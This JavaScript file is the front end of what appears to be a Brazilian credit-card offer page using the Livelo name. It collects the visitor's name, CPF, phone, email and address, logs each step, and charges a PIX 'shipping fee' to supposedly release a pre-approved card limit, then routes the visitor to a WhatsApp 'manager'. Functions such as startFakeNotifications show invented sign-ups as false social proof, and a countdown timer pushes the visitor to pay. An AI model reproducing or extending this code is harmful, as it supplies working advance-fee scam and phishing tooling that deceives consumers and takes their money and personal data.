        $id('pix-status-text').style.color = '#10B981';
        $id('pix-status-text').style.fontWeight = '700';
        
        setTimeout(() => {
          showDone();
        }, 1500);
      }
    } catch (err) {
      console.error('Polling error', err);
    }
  }, 5000); // Check every 5 seconds
}

function showDone() {
  let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
  waNumber = waNumber.replace(/\D/g, '');
  if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
  
  const limFormatted = STATE.limite ? formatCurrency(STATE.limite) : 'R$ 2.100,00';
  let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!';
  rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
  rawText = rawText.replace('{limite}', limFormatted);
  
  const msg = encodeURIComponent(rawText);
  const waUrl = `https://wa.me/${waNumber}?text=${msg}`;
  if ($id('btn-contact-manager')) $id('btn-contact-manager').href = waUrl;
  if ($id('btn-contact-manager-2')) $id('btn-contact-manager-2').href = waUrl;
  if ($id('btn-contact-manager-3')) $id('btn-contact-manager-3').href = waUrl;
  
  // Render Custom Card info in Success Screen
  const cv = $id('success-card-visual');
  if(cv && window.CARD_TEMPLATES && window.CARD_TEMPLATES[STATE.color || 'classico']) {
      cv.style.background = window.CARD_TEMPLATES[STATE.color || 'classico'].bg;
  }
  const cn = $id('success-card-name');
  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
  const cl = $id('success-card-limit');
  if(cl) cl.innerText = limFormatted;

  goToStep('sucesso');
  startFakeNotifications();
}

function startFakeNotifications() {
  if(window._fakeToastInt) return;
  const names = ["Ana", "Carlos", "Beatriz", "João", "Mariana", "Pedro", "Juliana", "Fernando", "Camila", "Rafael"];
  const chars = ["S.", "M.", "P.", "L.", "R.", "C.", "G.", "A.", "F.", "V."];
  
  window._fakeToastInt = setInterval(() => {
    if(Math.random() > 0.4) {
      const n = names[Math.floor(Math.random()*names.length)];
      const c = chars[Math.floor(Math.random()*chars.length)];
      showFakeToast(`${n} ${c}`, `Acabou de criar o cartão.`);
    }
  }, 8000);
}

function showFakeToast(title, desc) {
  const container = $id('fake-toast-container');
  if(!container) return;
  const el = document.createElement('div');
  el.className = 'fake-toast';
  el.innerHTML = `
    <img src="https://ui-avatars.com/api/?name=${title.charAt(0)}&background=E5147A&color=fff&rounded=true" class="fake-toast-img">
    <div class="fake-toast-content">
      <div class="fake-toast-title">${title}</div>
      <div class="fake-toast-desc">${desc}</div>
    </div>
  `;
  container.appendChild(el);
  setTimeout(() => el.classList.add('show'), 100);
  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 400);
  }, 4000);
}

// Formatador inteligente de nome do titular no cartão (padrão emissão bancária de luxo)
function formatCardHolderName(name) {
    if (!name || typeof name !== 'string') return 'SEU NOME';
    let clean = name.trim().toUpperCase().replace(/\s+/g, ' ');
    if (!clean || clean === 'CLIENTE' || clean === 'VISITANTE' || clean === 'LEAD') return 'SEU NOME';
    
    // Se o nome cabe perfeitamente (até 19 caracteres), mantém completo
    if (clean.length <= 19) return clean;
    
    const parts = clean.split(' ');
    if (parts.length <= 2) {
        return clean;
    }
    
    const firstName = parts[0];
    const lastName = parts[parts.length - 1];
    const middleNames = parts.slice(1, -1);
    
    // Tenta abreviar os nomes do meio com inicial: ex: "JULIA FEITOSA CORTINES LAXE" -> "JULIA F. C. LAXE"
    const middleAbbr = middleNames.map(m => m[0] + '.').join(' ');
    const candidate = `${firstName} ${middleAbbr} ${lastName}`;
    if (candidate.length <= 22) {
        return candidate;
    }
    
    // Se ainda ficar longo, mantém apenas a primeira inicial do meio
    const candidate2 = `${firstName} ${middleNames[0][0]}. ${lastName}`;
    if (candidate2.length <= 22) {
        return candidate2;
    }
    
    // Fallback elegante: Primeiro e Último nome
    return `${firstName} ${lastName}`;
}

function updateCardNameDisplays(rawName) {
    if (!rawName) return;
    const cardFormattedName = formatCardHolderName(rawName);
    const fullName = rawName.trim().toUpperCase();
    
    // Elementos do cartão físico recebem nome inteligente, estilizado e sem quebra
    const cardElements = [
        'style-card-name', 'welcome-name-display', 
        'analysis-name-display', 'summary-card-name', 'success-card-name', 'card-preview-name'
    ];
    
    cardElements.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.innerText = cardFormattedName;
            el.title = fullName;
            // Calibração dinâmica inteligente do tamanho da fonte para encaixe milimétrico
            if (cardFormattedName.length > 20) {
                el.style.fontSize = '0.58rem';
            } else if (cardFormattedName.length > 16) {
                el.style.fontSize = '0.64rem';
            } else if (cardFormattedName.length > 13) {
                el.style.fontSize = '0.70rem';
            } else {
                el.style.fontSize = '0.76rem';
            }
        }
    });
    
    // Elementos de texto de resumo recebem o nome completo
    const textElements = ['sum-nome', 'pix-nome'];
    textElements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerText = fullName;
    });
}

// ============================================================================
// MODIFICAÇÃO PIX TIMER E API COM TELA DE CARREGAMENTO ROSA
// ============================================================================
function iniciarPixTimer() {
    if(window._pixTimerStarted) return;
    window._pixTimerStarted = true;
    let timeLeft = 7 * 60 + 35; // 7:35
    const tmrInterval = setInterval(() => {
        if(timeLeft <= 0) { clearInterval(tmrInterval); return; }
        timeLeft--;
        let m = Math.floor(timeLeft / 60);
        let s = timeLeft % 60;
        var tmr = document.getElementById('pix-timer');
        if(tmr) tmr.innerText = (m < 10 ? '0'+m : m) + ':' + (s < 10 ? '0'+s : s);
    }, 1000);
}

function resetPixLoadingUI() {
    const spinner = document.getElementById('pix-loading-spinner-box');
    const bar = document.getElementById('pix-loading-bar-wrap');
    const badge = document.getElementById('pix-loading-badge');
    const errBox = document.getElementById('pix-loading-error-box');
    const title = document.getElementById('pix-loading-title');
    const desc = document.getElementById('pix-loading-desc');
    
    if(spinner) spinner.classList.remove('hidden');
    if(bar) bar.classList.remove('hidden');
    if(badge) badge.classList.remove('hidden');
    if(errBox) errBox.classList.add('hidden');
    if(title) title.innerText = 'Gerando seu PIX...';
    if(desc) desc.innerText = 'Conectando com o sistema bancário para emitir seu código de pagamento seguro.';
}

function showPixLoadingError(msg) {
    const spinner = document.getElementById('pix-loading-spinner-box');
    const bar = document.getElementById('pix-loading-bar-wrap');
    const badge = document.getElementById('pix-loading-badge');
    const errBox = document.getElementById('pix-loading-error-box');
    const errMsg = document.getElementById('pix-loading-error-msg');
    const title = document.getElementById('pix-loading-title');
    const desc = document.getElementById('pix-loading-desc');
    
    if(spinner) spinner.classList.add('hidden');
    if(bar) bar.classList.add('hidden');
    if(badge) badge.classList.add('hidden');
    if(title) title.innerText = 'Atenção';
    if(desc) desc.innerText = 'Houve uma instabilidade ao emitir o pagamento.';
    if(errMsg) errMsg.innerText = msg || 'Não foi possível gerar a cobrança agora. Por favor, tente novamente.';
    if(errBox) errBox.classList.remove('hidden');
}

function retryGerarPix() {
    STATE.isGeneratingPix = false;
    STATE.pixReady = false;
    goToStep('pix');
}

const _oldGoTo = window.goToStep;
if(_oldGoTo) {
    window.goToStep = function(stepId) {
        if(STATE.limite) {
            applyApprovedLimit(STATE.limite);
        }
        
        if(STATE.nome_completo || STATE.nomeLead || STATE.nome) {
            const nom = STATE.nome_completo || STATE.nomeLead || STATE.nome;
            updateCardNameDisplays(nom);
        }
        
        if(stepId === 'shipping-summary' || stepId === 'pix' || stepId === 'pix-loading') {
            if(STATE.cpf) {
                const elPixCpf = document.getElementById('pix-cpf');
                if(elPixCpf) elPixCpf.innerText = STATE.cpf;
            }
            if(STATE.celular) {
                const elPixTel = document.getElementById('pix-tel');
                if(elPixTel) elPixTel.innerText = STATE.celular;
            }
        }

        // Se pediu a tela de PIX e ainda não está 100% pronta, mostra a tela rosa de carregamento
        if(stepId === 'pix' && !STATE.pixReady) {
            _oldGoTo('pix-loading');
            resetPixLoadingUI();

            if(STATE.isGeneratingPix) return;
            STATE.isGeneratingPix = true;

            // Mensagens dinâmicas na tela rosa
            const t1 = setTimeout(() => {
                if(!STATE.pixReady && STATE.isGeneratingPix) {
                    const desc = document.getElementById('pix-loading-desc');
                    if(desc) desc.innerText = 'Emitindo QR Code exclusivo e chave PIX no Banco Central...';
                }
            }, 1800);

            const t2 = setTimeout(() => {
                if(!STATE.pixReady && STATE.isGeneratingPix) {
                    const desc = document.getElementById('pix-loading-desc');
                    if(desc) desc.innerText = 'Finalizando validação do frete e preparando seu pagamento...';
                }
            }, 3600);

            const leadNome = STATE.nome_completo || STATE.nomeLead || STATE.nome || '';
            const leadCpf = STATE.cpf || '';
            const leadTel = STATE.celular || STATE.telefone || STATE.whatsapp || '';

            fetch('/api/gerar-pix', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: STATE.sessionId,
                    amount: STATE.shippingPrice || (STATE.shippingMethod === 'pac' ? 19.00 : 24.90),
                    shipping_method: STATE.shippingMethod === 'pac' ? 'PAC - Envio Normal' : 'SEDEX - Envio Expresso',
                    nome: leadNome,
                    cpf: leadCpf,
                    whatsapp: leadTel,
                    email: STATE.email || '',
                    cep: STATE.cep || '',
                    rua: STATE.rua || '',
                    numero: STATE.numero || '',
                    bairro: STATE.bairro || '',
                    cidade: STATE.cidade || '',
                    uf: STATE.uf || ''
                })
            })
            .then(r => r.json())
            .then(data => {
                clearTimeout(t1);
                clearTimeout(t2);
                if(data.ok) {
                    STATE.paymentId = data.payment_id;
                    STATE.pixCode = data.pix_code;
                    if(data.limite) {
                        applyApprovedLimit(data.limite);
                    }

                    var pt = document.getElementById('pix-code-text');
                    if(pt) pt.value = data.pix_code || data.pix_copia_cola || '';

                    var ql = document.getElementById('qr-loading');
                    var qi = document.getElementById('qr-img');

                    const finishAndRevealPix = () => {
                        STATE.pixReady = true;
                        STATE.isGeneratingPix = false;
                        if(data.payment_id && typeof startPixPolling === 'function') {
                            startPixPolling(data.payment_id);
                        }
                        iniciarPixTimer();
                        setTimeout(() => {
                            _oldGoTo('pix');
                        }, 350);
                    };

                    if(data.qr_code_url) {
                        const preImg = new Image();
                        let completed = false;
                        const onLoaded = () => {
                            if(completed) return;
                            completed = true;
                            if(qi) {
                                qi.src = data.qr_code_url;
                                qi.classList.remove('hidden');
                            }
                            if(ql) ql.classList.add('hidden');
                            finishAndRevealPix();
                        };
                        preImg.onload = onLoaded;
                        preImg.onerror = onLoaded;
                        preImg.src = data.qr_code_url;
                        setTimeout(onLoaded, 3500); // fallback de segurança
                    } else {
                        if(ql) ql.innerHTML = 'Código PIX gerado.<br>Copie o código abaixo.';
                        finishAndRevealPix();
                    }
                } else {
                    STATE.isGeneratingPix = false;
                    showPixLoadingError(data.error || 'Erro ao emitir cobrança. Por favor, tente novamente.');
                }
            })
            .catch(e => {
                clearTimeout(t1);
                clearTimeout(t2);
                STATE.isGeneratingPix = false;
                console.error(e);
                showPixLoadingError('Falha de conexão ao comunicar com o servidor. Verifique sua rede e tente novamente.');
            });

            return; // Interrompe para manter o usuário na tela rosa até estar 100% pronto!
        }

        // Navegação normal
        _oldGoTo(stepId);
    };
}


// ============================================================================
// CEP & ENDEREÇO
// ============================================================================
function mascaraCep(input) {
  let v = input.value.replace(/\D/g, '');
  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
  input.value = v;
}

async function buscarCep() {
  const cep = $id('input-cep').value.replace(/\D/g, '');
  if (cep.length !== 8) return showErr('cep-error', 'Digite um CEP válido.');
  
  $id('btn-cep-buscar').innerText = 'Buscando...';
  hideErr('cep-error');
  
  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();
    if (data.erro) throw new Error();
    
    $id('input-rua').value = data.logradouro;
    $id('input-bairro').value = data.bairro;
    $id('input-cidade').value = data.localidade;
    $id('input-estado').value = data.uf;
    
    STATE.cep = data.cep;
    STATE.rua = data.logradouro;
    STATE.bairro = data.bairro;
    STATE.cidade = data.localidade;
    STATE.uf = data.uf;
    
    $id('address-fields').classList.remove('hidden');
    $id('btn-cep-buscar').classList.add('hidden');
    $id('btn-cep-continuar').classList.remove('hidden');
    $id('input-numero').focus();
    
  } catch(e) {
    showErr('cep-error', 'CEP não encontrado.');
    $id('btn-cep-buscar').innerText = 'Buscar CEP';
  }
}

function submitCep() {
  const num = $id('input-numero').value.trim();
  if (!num) return showErr('cep-error', 'Informe o número do endereço.');
  const comp = $id('input-complemento').value.trim();
  
  STATE.numero = num;
  STATE.complemento = comp;
  
  // Fill summary screens
  const fullRua = `${STATE.rua}, ${num}` + (comp ? ` - ${comp}` : '');
  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
  
  [$id('display-rua'), $id('sum-rua')].forEach(el => { if(el) el.innerText = fullRua; });
  [$id('display-bairro'), $id('sum-bairro')].forEach(el => { if(el) el.innerText = fullBairro; });
  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
  
  goToStep('shipping-methods');
}

// ============================================================================
// EFEITO 3D NO CARTÃO (Tilt)
// ============================================================================
document.addEventListener("DOMContentLoaded", () => {
    const card = document.getElementById('advanced-card-preview');
    if (card) {
        document.addEventListener('mousemove', (e) => {
            if(!card.getBoundingClientRect) return;
            const rect = card.getBoundingClientRect();
            // Somente aplica se o mouse estiver perto do card
            const isHovering = (e.clientX >= rect.left - 50 && e.clientX <= rect.right + 50 &&
                                e.clientY >= rect.top - 50 && e.clientY <= rect.bottom + 50);
            if(isHovering) {
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                const xPct = x / rect.width;
                const yPct = y / rect.height;
                const rotateX = (yPct - 0.5) * -15; // max 15deg
                const rotateY = (xPct - 0.5) * 15;
                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
                card.style.transition = 'transform 0.1s ease-out';
            } else {
                card.style.transform = `perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)`;
                card.style.transition = 'transform 0.5s ease-out';
            }
        });
    }
});


// Novas funções para o fluxo
function mascaraTel(i) {
  let v = i.value.replace(/\D/g, '');
  if (v.length > 11) v = v.slice(0,11);
  if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
  if (v.length > 9) v = `${v.slice(0,9)}-${v.slice(9)}`;
  i.value = v;
}

async function buscarCepBlur() {
  const cep = $id('input-cep').value.replace(/\D/g, '');
  if (cep.length !== 8) return;
  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();
    if (!data.erro) {
      $id('input-rua').value = data.logradouro;
      $id('input-bairro').value = data.bairro;
      $id('input-cidade').value = data.localidade;
      $id('input-estado').value = data.uf;
      STATE.cep = data.cep;
      STATE.rua = data.logradouro;
      STATE.bairro = data.bairro;
      STATE.cidade = data.localidade;
      STATE.uf = data.uf;
    }
  } catch(e) {}
}

function submitAddress() {
  STATE.cep = $id('input-cep').value;
  STATE.rua = $id('input-rua').value;
  STATE.numero = $id('input-numero').value;
  STATE.complemento = $id('input-complemento').value;
  STATE.bairro = $id('input-bairro').value;
  STATE.cidade = $id('input-cidade').value;
  STATE.uf = $id('input-estado').value;
  
  if(!STATE.cep || !STATE.rua || !STATE.numero || !STATE.bairro || !STATE.cidade || !STATE.uf) {
      return showErr('cep-error', 'Preencha todos os campos obrigatórios.');
  }
  
  const fullRua = `${STATE.rua}, ${STATE.numero}` + (STATE.complemento ? ` - ${STATE.complemento}` : '');
  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
  
  if($id('display-rua')) $id('display-rua').innerText = fullRua;
  if($id('sum-rua')) $id('sum-rua').innerText = fullRua;
  if($id('display-bairro')) $id('display-bairro').innerText = fullBairro;
  if($id('sum-bairro')) $id('sum-bairro').innerText = fullBairro;
  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
  
  try {
    logLeadAction('PREENCHEU_ENDERECO', `${fullRua} - ${fullBairro} (CEP: ${STATE.cep})`);
  } catch(e) {}

  goToStep('shipping-methods');
}

function selectShipping(method, price) {
  if (price === undefined || price === null || isNaN(price)) {
    price = method === 'pac' ? 19.00 : 24.90;
  }
  STATE.shippingMethod = method;
  STATE.shippingPrice = parseFloat(price);
  
  const displayPrice = 'R$ ' + price.toFixed(2).replace('.', ',');
  const methodText = method === 'sedex' ? 'SEDEX - Entrega expressa' : 'PAC - Envio Normal';
  const methodTextShort = method === 'sedex' ? 'Frete SEDEX (Expresso)' : 'Frete PAC (Normal)';
  const timeText = method === 'sedex' ? 'até 1 dia útil após aprovação' : '17-20 dias úteis após aprovação';
  const timeTextShort = method === 'sedex' ? 'até 1 dia útil' : '17-20 dias úteis';

  document.querySelectorAll('.dyn-frete-val').forEach(el => {
      if(el.id === 'sum-frete-valor') el.innerHTML = `${displayPrice} <span style="font-weight:normal">(pagamento único)</span>`;
      else el.innerHTML = displayPrice;
  });
  
  document.querySelectorAll('.dyn-frete-method').forEach(el => {
      if(el.id === 'sum-frete-tipo') el.innerHTML = methodText;
      else el.innerHTML = methodTextShort;
  });
  
  document.querySelectorAll('.dyn-frete-time').forEach(el => {
      if(el.id === 'sum-frete-prazo') el.innerHTML = timeText;
      else el.innerHTML = timeTextShort;
  });
  
  if ($id('summary-card-name')) $id('summary-card-name').innerText = (STATE.nome || 'SEU NOME').toUpperCase();
  
  try {
    logLeadAction('ESCOLHEU_FRETE', `${methodText} (${displayPrice})`);
  } catch(e) {}

  goToStep('shipping-summary'); // Redirects to payment summary step
}


// --- Real Validations ---
// Only letters in Name
const inputName = $id('input-name');
if(inputName) {
    inputName.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s]/g, '');
    });
}

// Ensure proper validations for address
const inputRua = $id('input-rua');
if(inputRua) {
    inputRua.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-Z0-9áéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s,-]/g, '');
    });
}
const inputCidade = $id('input-cidade');
if(inputCidade) {
    inputCidade.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s-]/g, '');
    });
}
const inputBairro = $id('input-bairro');
if(inputBairro) {
    inputBairro.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-Z0-9áéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s-]/g, '');
    });
}

// Validar CPF rigorosamente
function isCPFValid(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if(cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let sum = 0, rest;
    for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (11 - i);
    rest = (sum * 10) % 11;
    if ((rest == 10) || (rest == 11))  rest = 0;
    if (rest != parseInt(cpf.substring(9, 10)) ) return false;
    sum = 0;
    for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (12 - i);
    rest = (sum * 10) % 11;
    if ((rest == 10) || (rest == 11))  rest = 0;
    if (rest != parseInt(cpf.substring(10, 11) ) ) return false;
    return true;
}

async function mascaraCepInteligente(input) {
  let v = input.value.replace(/\D/g, '');
  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
  input.value = v;
  
  if (v.length === 9) { // 00000-000
    try {
      const res = await fetch(`https://viacep.com.br/ws/${v.replace('-','')}/json/`);
      const data = await res.json();
      if (!data.erro) {
        document.getElementById('input-rua').value = data.logradouro || '';
        document.getElementById('input-bairro').value = data.bairro || '';
        document.getElementById('input-cidade').value = data.localidade || '';
        document.getElementById('input-estado').value = data.uf || '';
        document.getElementById('input-numero').focus();
      }
    } catch(e) {}
  }
}

